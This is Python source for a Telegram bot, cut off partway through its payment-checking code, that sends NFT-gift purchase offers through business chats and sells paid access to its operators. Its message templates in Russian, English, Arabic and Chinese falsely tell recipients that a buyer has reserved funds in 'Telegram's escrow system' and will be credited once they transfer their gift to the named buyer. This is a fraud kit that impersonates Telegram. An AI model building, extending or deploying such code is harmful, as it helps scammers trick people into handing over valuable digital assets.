import asyncio
import base64
import logging
import json
import os
import re
import secrets
import shutil
import string
import time
from decimal import Decimal, InvalidOperation
from urllib.parse import quote

import aiohttp
import aiosqlite

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
from aiogram.methods import DeleteBusinessMessages, SendMessage, EditMessageText
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
    LabeledPrice,
    PreCheckoutQuery,
)

# ============================================================
# НАСТРОЙКИ
# ============================================================

BOT_TOKEN = BOT_TOKEN = os.getenv("BOT_TOKEN", "")

OFFER_DURATION_HOURS = 6
PARALLEL = True
KEEPALIVE_SECONDS = 20
DEFAULT_LANGUAGE = "ru"
DEFAULT_BUYER = "@xmoys"
ESCROW_RESERVE_HOURS = 24
ACCEPT_FIRST = False

USE_PREMIUM_EMOJI = True
ACCEPT_EMOJI_ID = "5776375003280838798"
DECLINE_EMOJI_ID = "5778527486270770928"

STARS_PREMIUM_EMOJI_ID = "5848021027782661221"
GRAM_PREMIUM_EMOJI_ID = "5318901904686754959"

# ID администратора бота
ADMIN_ID = 8318557688

# Платный доступ
DB_PATH = os.getenv("DB_PATH", "/app/data/access.db")
LEGACY_DB_PATH = os.getenv("LEGACY_DB_PATH", "access.db")
STARS_EMOJI_ID = "5897651460509234625"
TON_API_URL = os.getenv("TON_API_URL", "https://toncenter.com/api/v2")
TON_API_V3_URL = os.getenv("TON_API_V3_URL", "https://toncenter.com/api/v3")
TONCENTER_API_KEY = os.getenv("TONCENTER_API_KEY", "")
DEFAULT_SUBSCRIPTION_PRICE = Decimal(os.getenv("SUBSCRIPTION_PRICE_TON", "1"))
DEFAULT_SUBSCRIPTION_DAYS = int(os.getenv("SUBSCRIPTION_DAYS", "30"))
DEFAULT_TON_ADDRESS = os.getenv("TON_ADDRESS", "")
PAYMENT_CHECK_INTERVAL = int(os.getenv("PAYMENT_CHECK_INTERVAL", "15"))

# Состояния ввода админ-панели хранятся в памяти только для текущего процесса.
ADMIN_STATES = {}
USER_STATES = {}

# Railway Volume обычно монтируется в /app/data. Создаём каталог автоматически
# и один раз переносим старую access.db, если она ещё лежит рядом с ботом.
try:
    db_dir = os.path.dirname(os.path.abspath(DB_PATH))
    os.makedirs(db_dir, exist_ok=True)
    if (
        os.path.abspath(DB_PATH) != os.path.abspath(LEGACY_DB_PATH)
        and not os.path.exists(DB_PATH)
        and os.path.exists(LEGACY_DB_PATH)
    ):
        shutil.copy2(LEGACY_DB_PATH, DB_PATH)
        logger_migration = True
    else:
        logger_migration = False
except Exception:
    logger_migration = False


# ============================================================
# ЛОГИ
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

logger = logging.getLogger(__name__)
if logger_migration:
    logger.info("LEGACY DATABASE COPIED TO %s", DB_PATH)


# ============================================================
# ТЕКСТЫ
# ============================================================

TEXTS = {
    "ru": {
        "offer": (
            "Пользователь предлагает вам\n"
            "<b>{amount} {currency}</b> за подарок {nft}.\n\n"
        ),
        "accept": "Принять",
        "decline": "Отклонить",
        "cancelled": "❌ <b>Предложение отклонено</b>",
        "stars": "Звёзд",
        "gram": "GRAM",
        "accept_template": (
            "<b>NFT Deal</b>\n\n"
            "Ордер #{order_id}\n\n"
            "Покупатель зарезервировал <b>{amount} {emoji} {currency}</b> через "
            "эскроу-систему Telegram. Средства хранятся на специальном "
            "эскроу-счёте и будут автоматически зачислены на ваш баланс "
            "{balance_asset} сразу после передачи подарка.\n\n"
            "Инструкция для завершения сделки:\n"
            "1. Передайте подарок пользователю: {buyer}\n"
            "2. Нажмите «Передать NFT» и выберите {nft}\n"
            "3. Подтвердите передачу подарка.\n\n"
            "Telegram зафиксирует транзакцию и моментально зачислит "
            "<b>{amount} {emoji} {currency}</b> на ваш баланс. "
            "Резерв действует {reserve} часа."
        ),
        "transfer_btn": "Передать NFT",
        "confirm_btn": "Подтвердить передачу",
        "expired": "Предложение больше не ограничено таймером.",
        "accept_warning": (
            "Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
            "Нажмите «ОК», если вы прочитали это сообщение."
        ),
    },
    "en": {
        "offer": (
            "The user is offering you\n"
            "<b>{amount} {currency}</b> for the gift {nft}.\n\n"
        ),
        "accept": "Accept",
        "decline": "Decline",
        "cancelled": "❌ <b>Offer declined</b>",
        "stars": "Stars",
        "gram": "GRAM",
        "accept_template": (
            "<b>NFT Deal</b>\n\n"
            "Order #{order_id}\n\n"
            "The buyer has reserved <b>{amount} {emoji} {currency}</b> through "
            "Telegram's escrow system. The funds are held in a special escrow "
            "account and will be automatically credited to your {balance_asset} "
            "balance immediately after the gift is transferred.\n\n"
            "Instructions to complete the deal:\n"
            "1. Transfer to the user: {buyer}\n"
            "2. Tap «Transfer NFT» and select {nft}\n"
            "3. Confirm the gift transfer.\n\n"
            "Telegram will record the transaction and instantly credit "
            "<b>{amount} {emoji} {currency}</b> to your balance. "
            "The reserve is valid for {reserve} hours."
        ),
        "transfer_btn": "Transfer NFT",
        "confirm_btn": "Confirm Transfer",
        "expired": "This offer has no expiration timer.",
        "accept_warning": (
            "Attention!\n\n"
            "Follow the instructions carefully to avoid losing the gift and receive payment.\n\n"
            "Tap «OK» if you have read this message."
        ),
    },
    "ar": {
        "offer": (
            "يقدم لك المستخدم\n"
            "<b>{amount} {currency}</b> مقابل الهدية {nft}.\n\n"
        ),
        "accept": "قبول",
        "decline": "رفض",
        "cancelled": "❌ <b>تم رفض العرض</b>",
        "stars": "Stars",
        "gram": "GRAM",
        "accept_template": (
            "<b>NFT Deal</b>\n\n"
            "الطلب #{order_id}\n\n"
            "قام المشتري بحجز <b>{amount} {emoji} {currency}</b> عبر "
            "نظام الضمان في Telegram. يتم الاحتفاظ بالأموال في حساب ضمان "
            "خاص وسيتم إضافتها تلقائيًا إلى رصيد {balance_asset} الخاص بك "
            "فور نقل الهدية.\n\n"
            "إرشادات لإتمام الصفقة:\n"
            "1. قم بالتحويل إلى المستخدم: {buyer}\n"
            "2. اضغط على «نقل NFT» واختر {nft}\n"
            "3. أكّد نقل الهدية.\n\n"
            "سيسجل Telegram المعاملة ويضيف فورًا "
            "<b>{amount} {emoji} {currency}</b> إلى رصيدك. "
            "الحجز صالح لمدة {reserve} ساعة."
        ),
        "transfer_btn": "نقل NFT",
        "confirm_btn": "تأكيد النقل",
        "expired": "هذا العرض غير محدد بوقت انتهاء.",
        "accept_warning": (
            "انتباه!\n\n"
            "اتبع التعليمات بدقة لتجنب فقدان الهدية واستلام الدفع.\n\n"
            "اضغط «موافق» إذا قرأت هذه الرسالة."
        ),
    },
    "zh": {
        "offer": (
            "用户向您提供\n"
            "<b>{amount} {currency}</b> 购买礼物 {nft}。\n\n"
        ),
        "accept": "接受",
        "decline": "拒绝",
        "cancelled": "❌ <b>报价已拒绝</b>",
        "stars": "Stars",
        "gram": "GRAM",
        "accept_template": (
            "<b>NFT Deal</b>\n\n"
            "订单 #{order_id}\n\n"
            "买家已通过 Telegram 托管系统预留了 <b>{amount} {emoji} {currency}</b>。"
            "资金存放在专用托管账户中，礼物转移后将立即自动记入您的 "
            "{balance_asset} 余额。\n\n"
            "完成交易的说明：\n"
            "1. 转移给用户：{buyer}\n"
            "2. 点击 «转移 NFT» 并选择 {nft}\n"
            "3. 确认礼物转移。\n\n"
            "Telegram 将记录此次交易，并立即将 "
            "<b>{amount} {emoji} {currency}</b> 记入您的余额。"
            "预留有效期为 {reserve} 小时。"
        ),
        "transfer_btn": "转移 NFT",
        "confirm_btn": "确认转移",
        "expired": "此报价没有过期计时器。",
        "accept_warning": (
            "注意！\n\n"
            "请严格按照说明操作，以免丢失礼物并顺利收款。\n\n"
            "阅读完毕后请点击「确定」。"
        ),
    },
}


# ============================================================
# ХРАНИЛИЩЕ АКТИВНЫХ ОФФЕРОВ
# ============================================================

OFFERS = {}


def currency_emoji_html(currency_key):
    if currency_key == "gram":
        return '<tg-emoji emoji-id="' + GRAM_PREMIUM_EMOJI_ID + '">💎</tg-emoji>'
    return '<tg-emoji emoji-id="' + STARS_PREMIUM_EMOJI_ID + '">⭐️</tg-emoji>'


# ============================================================
# ПОЛЬЗОВАТЕЛЬСКИЙ ИНТЕРФЕЙС И ОФФЕРЫ
# ============================================================

async def ensure_user_settings(user_id):
    now = int(time.time())
    db = await db_connect()
    try:
        await db.execute(
            "INSERT OR IGNORE INTO user_settings(user_id,language,timer_hours,notifications,created_at,updated_at) VALUES(?,?,?,?,?,?)",
            (user_id, DEFAULT_LANGUAGE, 6, 1, now, now),
        )
        await db.commit()
        cur = await db.execute("SELECT * FROM user_settings WHERE user_id=?", (user_id,))
        return await cur.fetchone()
    finally:
        await db.close()


async def get_user_settings(user_id):
    return await ensure_user_settings(user_id)


async def set_user_setting(user_id, field, value):
    if field not in {"language", "timer_hours", "notifications"}:
        return
    await ensure_user_settings(user_id)
    db = await db_connect()
    try:
        await db.execute(f"UPDATE user_settings SET {field}=?, updated_at=? WHERE user_id=?", (value, int(time.time()), user_id))
        await db.commit()
    finally:
        await db.close()


async def save_user_offer(order_id, owner_user_id, data, status, message_id, connection_id, chat_id, expires_at):
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "INSERT OR REPLACE INTO user_offers(order_id,owner_user_id,data_json,status,message_id,connection_id,chat_id,expires_at,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
            (order_id, owner_user_id, json.dumps(data, ensure_ascii=False), status, message_id, connection_id, chat_id, int(expires_at), now, now),
        )
        await db.commit()
    finally:
        await db.close()


async def update_user_offer_status(order_id, status):
    db = await db_connect()
    try:
        await db.execute("UPDATE user_offers SET status=?, updated_at=? WHERE order_id=?", (status, int(time.time()), order_id))
        await db.commit()
    finally:
        await db.close()


async def get_user_offer(order_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE order_id=?", (order_id,))
        return await cur.fetchone()
    finally:
        await db.close()


async def get_user_offers(user_id, limit=30):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE owner_user_id=? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
        return await cur.fetchall()
    finally:
        await db.close()


async def notify_user(user_id, text):
    try:
        settings = await get_user_settings(user_id)
        if int(settings["notifications"]) != 1:
            return
        await bot.send_message(user_id, text)
    except Exception as error:
        logger.info("USER NOTIFY ERROR | user=%s | %s", user_id, error)


def user_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Создать оффер", style="success", callback_data="user_create_offer")],
        [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
        [InlineKeyboardButton(text="Статистика", style="primary", callback_data="user_stats")],
        [InlineKeyboardButton(text="Быстрые команды", style="primary", callback_data="user_quick_commands")],
        [InlineKeyboardButton(text="Настройки", style="primary", callback_data="user_settings")],
    ])


def offer_status_label(status):
    return {
        "active": "активен",
        "accepted": "принят",
        "declined": "отклонён",
        "expired": "истёк",
    }.get(status, status)


def user_offers_keyboard(rows):
    buttons = []
    for row in rows[:8]:
        label = f"{row['order_id']} — {offer_status_label(row['status'])}"
        buttons.append([InlineKeyboardButton(text=label, style="primary", callback_data=f"user_offer:{row['order_id']}")])
    buttons.append([InlineKeyboardButton(text="Создать оффер", style="success", callback_data="user_create_offer")])
    buttons.append([InlineKeyboardButton(text="Статистика", style="primary", callback_data="user_stats")])
    buttons.append([InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


async def render_user_panel(message, edit=False):
    text = "<b>Панель пользователя</b>\n\nУправление офферами, статистикой и настройками."
    if edit:
        await message.edit_text(text, reply_markup=user_panel_keyboard())
    else:
        await message.answer(text, reply_markup=user_panel_keyboard())


async def send_business_offer(data, owner_user_id, connection_id, chat_id, order_id=None):
    order_id = order_id or generate_order_id()
    data = dict(data)
    data["order_id"] = order_id
    owner = await bot.get_chat(owner_user_id)
    data["buyer"] = f"@{owner.username}" if owner.username else str(owner_user_id)
    data["owner_user_id"] = owner_user_id
    data["created_by_panel"] = True
    OFFERS[order_id] = dict(data)
    nft_url = data["nft"]["url"]
    expires_at = 4102444800  # 2100-01-01; offer has no expiration timer
    OFFERS[order_id]["expires_at"] = expires_at
    offer_text, keyboard = create_offer(data, premium=USE_PREMIUM_EMOJI, order_id=order_id)
    sent = await bot(SendMessage(
        chat_id=chat_id,
        text=offer_text,
        business_connection_id=connection_id,
        reply_markup=keyboard,
        link_preview_options=LinkPreviewOptions(is_disabled=False, url=nft_url, show_above_text=True),
    ))
    OFFERS[order_id]["message_id"] = sent.message_id
    OFFERS[order_id]["connection_id"] = connection_id
    OFFERS[order_id]["chat_id"] = chat_id
    await save_user_offer(order_id, owner_user_id, data, "active", sent.message_id, connection_id, chat_id, expires_at)
    return order_id


async def repeat_user_offer(owner_user_id, order_id):
    row = await get_user_offer(order_id)
    if not row or int(row["owner_user_id"]) != owner_user_id:
        raise ValueError("Оффер не найден")
    data = json.loads(row["data_json"])
    settings = await get_user_settings(owner_user_id)
    data["language"] = settings["language"] if settings["language"] in TEXTS else data.get("language", DEFAULT_LANGUAGE)
    data["timer_hours"] = int(settings["timer_hours"])
    return await send_business_offer(data, owner_user_id, row["connection_id"], int(row["chat_id"]))

# ============================================================
# NFT URL
# ============================================================

NFT_REGEX = re.compile(
    r"^(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)$",
    re.IGNORECASE
)


def parse_nft(url):
    url = url.strip()
    match = NFT_REGEX.match(url)
    if not match:
        return None
    slug = match.group(1)
    match = re.match(r"^(.+)-(\d+)$", slug)
    if not match:
        return None
    collection = match.group(1)
    number = match.group(2)
    return {
        "slug": slug,
        "name": collection.replace("-", " "),
        "number": number,
        "url": "https://t.me/nft/" + slug,
    }


# ============================================================
# .BUY
# ============================================================

def parse_buy_command(text):
    parts = text.strip().split()
    if len(parts) < 3:
        return None
    if parts[0].lower() != ".buy":
        return None

    nft_url = parts[1]
    amount_raw = parts[2]

    try:
        amount_value = float(amount_raw)
        if amount_value <= 0:
            return None
    except ValueError:
        return None

    if amount_value.is_integer():
        amount = str(int(amount_value))
    else:
        amount = str(amount_value)

    currency = "stars"
    language = DEFAULT_LANGUAGE
    timer_hours = 6

    for argument in parts[3:]:
        argument_lower = argument.lower()
        if argument_lower in ("stars", "star", "tt"):
            currency = "stars"
        elif argument_lower == "gram":
            currency = "gram"
        elif argument_lower == "ru":
            language = "ru"
        elif argument_lower == "en":
            language = "en"
        elif argument_lower == "ar":
            language = "ar"
        elif argument_lower in ("zh", "cn", "kit"):
            language = "zh"
        elif argument_lower in ("6", "6h", "6ч"):
            timer_hours = 6
        elif argument_lower in ("12", "12h", "12ч"):
            timer_hours = 12

    nft = parse_nft(nft_url)
    if nft is None:
        return None

    return {
        "nft": nft,
        "amount": amount,
        "currency": currency,
        "language": language,
        "timer_hours": timer_hours,
        "buyer": None,
    }


# ============================================================
# ID ОРДЕРА
# ============================================================

ORDER_ALPHABET = string.ascii_uppercase + string.digits


def generate_order_id():
    suffix = "".join(secrets.choice(ORDER_ALPHABET) for _ in range(8))
    return "TG-" + suffix


# ============================================================
# СОЗДАНИЕ ОФФЕРА
# ============================================================

def create_offer(data, premium=True, order_id="", remaining_seconds=None):
    nft = data["nft"]
    amount = data["amount"]
    currency = data["currency"]
    language = data["language"]

    lang = TEXTS[language]

    nft_html = '<a href="' + nft["url"] + '">' + nft["name"] + " #" + nft["number"] + "</a>"

    text = lang["offer"].format(
        amount=amount,
        currency=currency_emoji_html(currency) if premium else ("⭐️" if currency == "stars" else lang[currency]),
        nft=nft_html,
    )

    if premium:
        accept_button = InlineKeyboardButton(
            text=lang["accept"],
            callback_data="offer_accept:" + language + ":" + order_id,
        )
        decline_button = InlineKeyboardButton(
            text=lang["decline"],
            callback_data="offer_decline:" + language + ":" + order_id,
        )
    else:
        accept_button = InlineKeyboardButton(
            text=lang["accept"],
            callback_data="offer_accept:" + language + ":" + order_id,
        )
        decline_button = InlineKeyboardButton(
            text=lang["decline"],
            callback_data="offer_decline:" + language + ":" + order_id,
        )

    if ACCEPT_FIRST:
        row = [accept_button, decline_button]
    else:
        row = [decline_button, accept_button]

    keyboard = InlineKeyboardMarkup(inline_keyboard=[row])
    return text, keyboard


# ============================================================
# ТЕКСТ "NFT DEAL"
# ============================================================

def create_accept_text(data):
    """Динамическая инструкция; оплата не объявляется подтверждённой без проверки."""
    from html import escape
    nft = data["nft"]
    currency = (data.get("currency") or "stars").lower()
    amount = escape(str(data.get("amount", "")))
    name = escape(str(nft.get("name", "NFT")))
    number = escape(str(nft.get("number", "")))
    order = escape(str(data.get("order_id") or generate_order_id()))
    asset = "GRAM" if currency == "gram" else "Stars"
    gift = f"{name} #{number}"
    nft_url = escape(str(nft.get("url") or "https://t.me/nft/" + str(nft.get("slug", ""))), quote=True)
    linked_gift = f'<a href="{nft_url}">{gift}</a>'
    emoji = currency_emoji_html(currency)
    recipient = escape(str(data.get("buyer") or "не указан"))
    return (
        f"<b><i>Сделка — #{order}</i></b>\n\n"
        f"<b><i>Покупатель предложил {amount} {emoji} {asset} "
        f"за подарок {gift}.</i></b>\n\n"
        "<b><i>Инструкция по передаче NFT:</i></b>\n\n"
        "<b><i>1. Проверьте данные сделки и статус оплаты.</i></b>\n\n"
        f"<b><i>2. Проверьте подарок {linked_gift} "
        f"и данные покупателя {recipient} перед передачей.</i></b>\n\n"
        "<b><i>3. Убедитесь, что передача завершена.</i></b>\n\n"
        "<b><i>После передачи проверьте поступление средств "
        "согласно условиям сервиса.</i></b>"
    )


def buyer_username_for_url(data):
    return str(data.get("buyer") or "").lstrip("@")


def create_accept_keyboard(data):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="Профиль покупателя",
            url="https://t.me/" + buyer_username_for_url(data)
        )
    ]])


def language_from_callback(data):
    parts = data.split(":")
    if len(parts) < 2:
        return DEFAULT_LANGUAGE
    language = parts[1]
    if language not in TEXTS:
        return DEFAULT_LANGUAGE
    return language


def order_id_from_callback(data):
    parts = data.split(":", 2)
    if len(parts) < 3:
        return ""
    return parts[2]


# ============================================================
# БАЗА ДОСТУПА И ПЛАТЕЖЕЙ
# ============================================================

async def db_connect():
    db = await aiosqlite.connect(DB_PATH)
    db.row_factory = aiosqlite.Row
    return db


async def init_db():
    db = await db_connect()
    try:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS subscriptions (
            user_id INTEGER PRIMARY KEY,
            expires_at INTEGER NOT NULL,
            source TEXT NOT NULL DEFAULT 'payment'
        );
        CREATE TABLE IF NOT EXISTS free_access (
            user_id INTEGER PRIMARY KEY,
            added_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS payments (
            invoice_id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            amount_nano INTEGER NOT NULL,
            comment TEXT NOT NULL UNIQUE,
            created_at INTEGER NOT NULL,
            expires_at INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            tx_hash TEXT,
            days INTEGER
        );
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            days INTEGER NOT NULL,
            ton_price TEXT NOT NULL,
            stars_price INTEGER NOT NULL,
            active INTEGER NOT NULL DEFAULT 1,
            created_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS stars_payments (
            payment_id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            product_id INTEGER NOT NULL,
            stars_price INTEGER NOT NULL,
            created_at INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT 'paid',
            telegram_charge_id TEXT UNIQUE
        );
        CREATE TABLE IF NOT EXISTS internal_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            added_at INTEGER NOT NULL,
            last_seen INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS accepted_deals (
            order_id TEXT PRIMARY KEY,
            buyer TEXT,
            amount TEXT NOT NULL,
            currency TEXT NOT NULL,
            nft_name TEXT NOT NULL,
            nft_number TEXT NOT NULL,
            nft_url TEXT NOT NULL,
            accepted_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS user_offers (
            order_id TEXT PRIMARY KEY,
            owner_user_id INTEGER NOT NULL,
            data_json TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'active',
            message_id INTEGER,
            connection_id TEXT,
            chat_id INTEGER,
            expires_at INTEGER NOT NULL,
            created_at INTEGER NOT NULL,
            updated_at INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS user_settings (
            user_id INTEGER PRIMARY KEY,
            language TEXT NOT NULL DEFAULT 'ru',
            timer_hours INTEGER NOT NULL DEFAULT 6,
            notifications INTEGER NOT NULL DEFAULT 1,
            created_at INTEGER NOT NULL,
            updated_at INTEGER NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);
        """)
        cur = await db.execute("PRAGMA table_info(payments)")
        payment_columns = {row["name"] for row in await cur.fetchall()}
        if "product_id" not in payment_columns:
            await db.execute("ALTER TABLE payments ADD COLUMN product_id INTEGER")
        if "days" not in payment_columns:
            await db.execute("ALTER TABLE payments ADD COLUMN days INTEGER")
        defaults = {
            "subscription_price_ton": str(DEFAULT_SUBSCRIPTION_PRICE),
            "subscription_days": str(DEFAULT_SUBSCRIPTION_DAYS),
            "ton_address": DEFAULT_TON_ADDRESS,
        }
        for key, value in defaults.items():
            await db.execute(
                "INSERT OR IGNORE INTO settings(key, value) VALUES(?, ?)",
                (key, value),
            )
        cur = await db.execute("SELECT COUNT(*) c FROM products")
        if (await cur.fetchone())["c"] == 0:
            await db.execute(
                "INSERT INTO products(name, days, ton_price, stars_price, active, created_at) VALUES(?,?,?,?,1,?)",
                ("Подписка", DEFAULT_SUBSCRIPTION_DAYS, str(DEFAULT_SUBSCRIPTION_PRICE), int(os.getenv("SUBSCRIPTION_STARS", "100")), int(time.time())),
            )
        await db.commit()
    finally:
        await db.close()


async def get_setting(key, default=""):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT value FROM settings WHERE key=?", (key,))
        row = await cur.fetchone()
        return row["value"] if row else default
    finally:
        await db.close()


async def set_setting(key, value):
    db = await db_connect()
    try:
        await db.execute(
            "INSERT INTO settings(key, value) VALUES(?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (key, str(value)),
        )
        await db.commit()
    finally:
        await db.close()


async def register_internal_user(user_id, username=None, first_name=None):
    if not user_id:
        return
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "INSERT INTO internal_users(user_id,username,first_name,added_at,last_seen) VALUES(?,?,?,?,?) "
            "ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, first_name=excluded.first_name, last_seen=excluded.last_seen",
            (int(user_id), username, first_name, now, now),
        )
        await db.commit()
    finally:
        await db.close()


async def has_access(user_id):
    now = int(time.time())
    db = await db_connect()
    try:
        cur = await db.execute("SELECT 1 FROM free_access WHERE user_id=?", (user_id,))
        if await cur.fetchone():
            return True
        cur = await db.execute(
            "SELECT expires_at FROM subscriptions WHERE user_id=?", (user_id,)
        )
        row = await cur.fetchone()
        return bool(row and int(row["expires_at"]) > now)
    finally:
        await db.close()


async def add_free_access(user_id):
    db = await db_connect()
    try:
        await db.execute(
            "INSERT OR IGNORE INTO free_access(user_id, added_at) VALUES(?, ?)",
            (user_id, int(time.time())),
        )
        await db.commit()
    finally:
        await db.close()


async def remove_free_access(user_id):
    db = await db_connect()
    try:
        await db.execute("DELETE FROM free_access WHERE user_id=?", (user_id,))
        await db.commit()
    finally:
        await db.close()


async def revoke_user_access(user_id):
    db = await db_connect()
    try:
        await db.execute("DELETE FROM subscriptions WHERE user_id=?", (user_id,))
        await db.execute("DELETE FROM free_access WHERE user_id=?", (user_id,))
        await db.commit()
    finally:
        await db.close()


async def extend_subscription(user_id, days):
    now = int(time.time())
    db = await db_connect()
    try:
        cur = await db.execute(
            "SELECT expires_at FROM subscriptions WHERE user_id=?", (user_id,)
        )
        row = await cur.fetchone()
        base = max(now, int(row["expires_at"])) if row else now
        expires = base + int(days) * 86400
        await db.execute(
            "INSERT INTO subscriptions(user_id, expires_at, source) VALUES(?, ?, 'payment') "
            "ON CONFLICT(user_id) DO UPDATE SET expires_at=excluded.expires_at, source='payment'",
            (user_id, expires),
        )
        await db.commit()
        return expires
    finally:
        await db.close()


def ton_to_nano(value):
    return int(Decimal(str(value)) * Decimal(1_000_000_000))


def format_ton(value):
    return format(Decimal(str(value)).normalize(), "f")


async def get_products(active_only=True):
    db = await db_connect()
    try:
        sql = "SELECT * FROM products" + (" WHERE active=1" if active_only else "") + " ORDER BY id"
        cur = await db.execute(sql)
        return await cur.fetchall()
    finally:
        await db.close()


async def get_product(product_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM products WHERE id=?", (product_id,))
        return await cur.fetchone()
    finally:
        await db.close()


async def create_invoice(user_id, product_id=None):
    product = await get_product(product_id) if product_id is not None else None
    if product is not None:
        price = Decimal(product["ton_price"])
        days = int(product["days"])
    else:
        price = Decimal(await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE)))
        days = int(await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS)))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    if price <= 0:
        raise ValueError("Цена подписки должна быть больше 0")
    if not address.strip():
        raise ValueError("TON-адрес для оплаты ещё не настроен")

    now = int(time.time())
    invoice_id = secrets.token_hex(8).upper()
    comment = f"SUB-{user_id}-{invoice_id}"
    amount_nano = ton_to_nano(price)
    expires_at = now + 30 * 60

    db = await db_connect()
    try:
        await db.execute(
            "INSERT INTO payments(invoice_id,user_id,amount_nano,comment,created_at,expires_at,product_id,days) "
            "VALUES(?,?,?,?,?,?,?,?)",
            (invoice_id, user_id, amount_nano, comment, now, expires_at, product_id, days),
        )
        await db.commit()
    finally:
        await db.close()

    pay_url = (
        f"ton://transfer/{address.strip()}?amount={amount_nano}&text={quote(comment)}"
    )
    return {
        "invoice_id": invoice_id,
        "comment": comment,
        "amount": price,
        "amount_nano": amount_nano,
        "days": days,
        "expires_at": expires_at,
        "address": address.strip(),
        "pay_url": pay_url,
    }


def _recursive_text_candidates(value):
    """Collect likely human-readable text from TON API message structures."""
    out = []
    if isinstance(value, str):
        text = value.strip()
        if text:
            out.append(text)
    elif isinstance(value, dict):
        for key in ("message", "text", "comment", "value"):
            item = value.get(key)
            if isinstance(item, str) and item.strip():
                out.append(item.strip())
        for key in ("decoded", "message_content", "msg_data"):
            if key in value:
                out.extend(_recursive_text_candidates(value.get(key)))
    elif isinstance(value, list):
        for item in value:
            out.extend(_recursive_text_candidates(item))
    return out


def decode_payment_comment(in_msg):
    if not in_msg:
        return ""

    # Legacy TON Center v2 responses may expose a ready-made `message` field.
    for candidate in _recursive_text_candidates(in_msg):
        if candidate.startswith("SUB-"):
            return candidate

    # Some v2 responses store a base64-encoded text cell.
    msg_data = in_msg.get("msg_data") or {}
    if isinstance(msg_data, dict):
        raw = msg_data.get("text") or msg_data.get("body")
        if raw:
            try:
                decoded = base64.b64decode(raw + "=" * (-len(raw) % 4)).decode("utf-8", errors="ignore").strip()
                if decoded.startswith("SUB-"):
                    return decoded
            except Exception:
                pass

    # v3 indexed responses expose message_content. Prefer its decoded text,
    # but also inspect raw body when it happens to contain a plain/base64 text.
    content = in_msg.get("message_content") or {}
    for candidate in _recursive_text_candidates(content):
        if candidate.startswith("SUB-"):
            return candidate
    body = content.get("body") if isinstance(content, dict) else None
    if isinstance(body, str):
        for raw in (body,):
            try:
                decoded = base64.b64decode(raw + "=" * (-len(raw) % 4)).decode("utf-8", errors="ignore").strip("\x00 \t\r\n")
                if "SUB-" in decoded:
                    return decoded[decoded.find("SUB-"):].split("\x00", 1)[0].strip()
            except Exception:
                pass
    return ""


async def ton_get_transactions(address):
    """Read incoming TON transfers using indexed v3, with v2 fallback."""
    headers = {"Accept": "application/json"}
    if TONCENTER_API_KEY:
        headers["X-API-Key"] = TONCENTER_API_KEY
    timeout = aiohttp.ClientTimeout(total=20)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        # v3 is indexed and exposes message_content/in_msg consistently.
        try:
            params = {
                "account": address,
                "limit": 100,
                "sort": "desc",
            }
            async with session.get(f"{TON_API_V3_URL}/transactions", params=params, headers=headers) as response:
                data = await response.json(content_type=None)
                if response.status == 200 and isinstance(data, dict) and "transactions" in data:
                    return data.get("transactions") or []
                logger.warning("TON v3 response: HTTP %s %s", response.status, data.get("error", ""))
        except Exception as error:
            logger.warning("TON v3 request failed: %s", error)

        # Keep v2 as a compatibility fallback for older environments/API keys.
        params = {"address": address, "limit": 100, "archival": "true"}
        async with session.get(f"{TON_API_URL}/getTransactions", params=params, headers=headers) as response:
            data = await response.json(content_type=None)
            if response.status != 200 or not data.get("ok"):
                raise RuntimeError(data.get("error", f"TON API HTTP {response.status}"))
            return data.get("result", [])


async def check_payments_once():
    address = (await get_setting("ton_address", DEFAULT_TON_ADDRESS)).strip()
    if not address:
        return

    try:
        transactions = await ton_get_transactions(address)
    except Exception as error:
        logger.warning("TON PAYMENT CHECK ERROR: %s", error)
        return

    db = await db_connect()
    try:
        cur = await db.execute(
